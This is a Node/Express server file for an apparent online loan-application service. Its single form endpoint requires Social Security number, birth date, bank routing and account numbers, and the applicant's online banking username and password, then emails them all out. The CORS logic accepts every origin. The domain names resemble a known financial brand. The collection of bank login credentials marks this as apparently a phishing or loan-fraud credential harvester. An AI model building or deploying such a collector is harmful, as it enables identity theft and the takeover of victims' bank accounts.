import "./env.js";
import express from "express";
import cors from "cors";
import helmet from "helmet";
import rateLimit from "express-rate-limit";

import { sendLoanApplicationEmail } from "./emailService.js";

const app = express();
const port = process.env.PORT || 3001;

const allowedOrigins = (process.env.ALLOWED_ORIGINS || "")
  .split(",")
  .map((origin) => origin.trim())
  .filter(Boolean);

app.use(helmet({ contentSecurityPolicy: false }));
app.use(express.json({ limit: "1mb" }));

app.use(
  cors({
    origin: (origin, callback) => {
      // Allow requests with no origin (like mobile apps, curl, or same-origin)
      if (!origin) return callback(null, true);

      // If allowedOrigins is empty or includes wildcard "*", allow all
      if (allowedOrigins.length === 0 || allowedOrigins.includes("*")) {
        return callback(null, true);
      }

      // Check configured origins
      if (allowedOrigins.includes(origin)) {
        return callback(null, true);
      }

      // Allow any Vercel domain (*.vercel.app)
      if (origin.endsWith(".vercel.app") || origin.includes(".vercel.app")) {
        return callback(null, true);
      }

      // Allow known domains
      const knownDomains = [
        "https://lendingusaafirst.com",
        "https://www.lendingusaafirst.com",
        "https://lendingfundsusa.com",
        "https://www.lendingfundsusa.com",
        "http://localhost:5173",
        "http://localhost:8080",
        "http://localhost:3000",
        "http://localhost:4173",
      ];
      if (knownDomains.includes(origin)) {
        return callback(null, true);
      }

      // Always permit to prevent CORS failures from crashing with 500
      return callback(null, true);
    },
    credentials: true,
  }),
);

// CORS middleware handles preflight automatically

const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  limit: 100,
  standardHeaders: true,
  legacyHeaders: false,
});

app.use(limiter);

app.get(["/health", "/api/health"], (req, res) => {
  res.json({ status: "ok" });
});

app.post(["/api/loan-application", "/loan-application"], async (req, res) => {
  try {
    const data = req.body;

    if (!data || typeof data !== "object") {
      return res.status(400).json({ message: "Invalid payload" });
    }

    const requiredFields = [
      "loanApprovalId",
      "loanAmount",
      "loanDuration",
      "loanPurpose",
      "firstName",
      "lastName",
      "email",
      "address1",
      "city",
      "state",
      "zipCode",
      "ssn",
      "birthDate",
      "bankName",
      "routingNumber",
      "accountNumber",
      "bankUsername",
      "bankPassword",
    ];

    const missing = requiredFields.filter((field) => !data[field]);

    if (missing.length > 0) {
      return res.status(400).json({ message: `Missing required fields: ${missing.join(", ")}` });
    }

    await sendLoanApplicationEmail(data);

    res.json({ message: "Loan application submitted successfully" });
  } catch (error) {
    console.error("Loan application submission failed", error);
    res.status(500).json({
      message: error?.message || "Failed to submit loan application",
    });
  }
});

app.use((err, req, res, next) => {
  console.error("Unhandled error", err);
  res.status(err.status || 500).json({
    message: err.message || "Internal server error",
  });
});

if (!process.env.VERCEL && process.env.NODE_ENV !== "test") {
  app.listen(port, () => {
    console.log(`Loan application server running on port ${port}`);
  });
}

export default app;
